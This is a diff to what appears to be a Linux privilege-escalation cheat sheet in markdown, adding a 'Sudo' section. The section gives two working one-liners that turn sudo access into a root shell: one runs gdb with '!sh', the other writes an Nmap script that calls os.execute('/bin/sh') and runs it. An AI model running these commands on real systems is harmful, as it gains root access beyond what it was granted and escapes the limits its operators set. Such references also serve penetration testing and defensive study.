@@ -83,3 +83,18 @@ Link => [ExploitDB-41154](https://www.exploit-db.com/exploits/41154)
 
 
 # Sudo
+
+- [Gdb](#gdb)
+- [Nmap](#nmap)
+
+## GDB
+
+```
+sudo /usr/bin/gdb -nx -ex '!sh' -ex quit
+```
+
+## Nmap
+
+```
+echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+```
